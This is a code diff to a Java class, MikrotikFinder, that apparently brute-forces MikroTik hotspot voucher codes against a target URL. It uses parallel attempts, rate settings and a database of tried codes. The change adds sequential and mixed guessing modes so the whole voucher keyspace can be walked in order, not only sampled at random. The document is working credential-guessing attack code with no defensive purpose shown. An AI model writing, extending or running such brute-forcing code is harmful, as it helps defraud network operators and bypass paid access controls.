@@ -42,6 +42,7 @@ public class MikrotikFinder {
     private final java.util.Set<String> triedInSession = java.util.Collections.synchronizedSet(new java.util.HashSet<>());
     private final AtomicLong totalAttempts = new AtomicLong(0);
     private final String allowedDigits;
+    private final int guessMode;
     private final java.util.concurrent.atomic.AtomicLong counter = new java.util.concurrent.atomic.AtomicLong(0);
     private final java.util.concurrent.atomic.AtomicInteger recentErrors = new java.util.concurrent.atomic.AtomicInteger(0);
     private final java.util.List<String> candidates = java.util.Collections.synchronizedList(new java.util.ArrayList<>());
@@ -60,7 +61,7 @@ public class MikrotikFinder {
                           String prefix, String middle, String suffix,
                           int varDigits, int maxAttempts, int waitMs, int parallel,
                           boolean relax, GuessDatabase db,
-                          String allowedDigits) {
+                          String allowedDigits, int guessMode) {
         this.rawUrl = cleanUrl(convertArabicNumerals(rawUrl));
         String calcBase;
         try {
@@ -85,6 +86,7 @@ public class MikrotikFinder {
         this.relax = relax;
         this.db = db;
         this.allowedDigits = (allowedDigits == null || allowedDigits.isEmpty()) ? "0123456789" : allowedDigits;
+        this.guessMode = guessMode;
         // 🧠 منطق عدم التكرار الذكي
         try {
             String savedPrefix = db.getConfig("prefix");
@@ -379,29 +381,50 @@ public class MikrotikFinder {
     private String generateVoucher() {
         int base = allowedDigits.length();
         long total = 1;
-        for (int i = 0; i < varDigits; i++) {
-            total *= base;
-            if (total > 100000000L) { total = 100000000L; break; }
-        }
-        
-        // إذا استُنفدت كل الاحتمالات
+        for (int i = 0; i < varDigits; i++) { total *= base; if (total > 100000000L) { total = 100000000L; break; } }
         if (triedInSession.size() >= total) return null;
         
-        // 🎲 عشوائي من الأرقام المسموحة فقط
-        for (int attempt = 0; attempt < 1000; attempt++) {
-            StringBuilder sb = new StringBuilder();
-            for (int j = 0; j < varDigits; j++) {
-                sb.append(allowedDigits.charAt((int)(Math.random() * base)));
+        String seqStr = null;
+        // mode: 0=random, 1=sequential, 2=mixed
+        if (guessMode == 1 || (guessMode == 2 && seqCounter.get() % 2 == 0)) {
+            // Sequential
+            for (int attempt = 0; attempt < 500; attempt++) {
+                long idx = seqCounter.getAndIncrement();
+                if (idx >= total) {
+                    if (guessMode == 1) return null;
+                    seqCounter.set(0);
+                    break;
+                }
+                char[] seq = new char[varDigits];
+                long n = idx;
+                for (int i = varDigits - 1; i >= 0; i--) {
+                    seq[i] = allowedDigits.charAt((int)(n % base));
+                    n /= base;
+                }
+                String s = new String(seq);
+                if (triedInSession.contains(s)) continue;
+                seqStr = s;
+                break;
             }
-            String seqStr = sb.toString();
-            if (triedInSession.contains(seqStr)) continue;
-            triedInSession.add(seqStr);
-            String v = buildVoucherWithVar(seqStr);
-            db.addAttemptWithStatus(v, "pending", null);
-            return v;
         }
         
-        return null;
+        // Fallback: random
+        if (seqStr == null) {
+            for (int attempt = 0; attempt < 1000; attempt++) {
+                StringBuilder sb = new StringBuilder();
+                for (int j = 0; j < varDigits; j++) sb.append(allowedDigits.charAt((int)(Math.random() * base)));
+                String s = sb.toString();
+                if (triedInSession.contains(s)) continue;
+                seqStr = s;
+                break;
+            }
+        }
+        
+        if (seqStr == null) return null;
+        triedInSession.add(seqStr);
+        String v = buildVoucherWithVar(seqStr);
+        db.addAttemptWithStatus(v, "pending", null);
+        return v;
     }
 
     // 🔧 منتصف الأرقام في المنتصف
